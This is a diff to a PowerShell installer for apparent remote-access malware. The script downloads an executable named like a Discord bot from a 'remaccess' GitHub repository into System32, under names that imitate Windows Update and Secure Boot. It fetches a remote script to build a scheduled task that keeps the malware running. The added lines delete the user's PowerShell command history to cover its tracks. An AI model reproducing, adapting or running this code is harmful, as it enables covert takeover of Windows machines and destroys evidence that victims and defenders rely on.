@@ -1,5 +1,6 @@
-$localFilePath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$localFilePath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe"
+$psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
 $url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordPingBotNewAcquisitions.exe"
 $pingdaemontask = "Windows Update Service Daemon"
 $urlfortc = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CoreFiles/TaskSchedulerServiceCreater.ps1"
@@ -70,3 +71,9 @@ Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false
 } else {}
 Register-ScheduledTask -Xml $pingdaemonxml -TaskName $pingdaemontask | Out-Null
 Start-ScheduledTask -TaskName $pingdaemontask
+if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
+    $files = Get-ChildItem -Path $psreadlineFolderPath
+    if ($files.Count -gt 0) {
+        Remove-Item -Path "$psreadlineFolderPath\*" -Force
+    }
+}
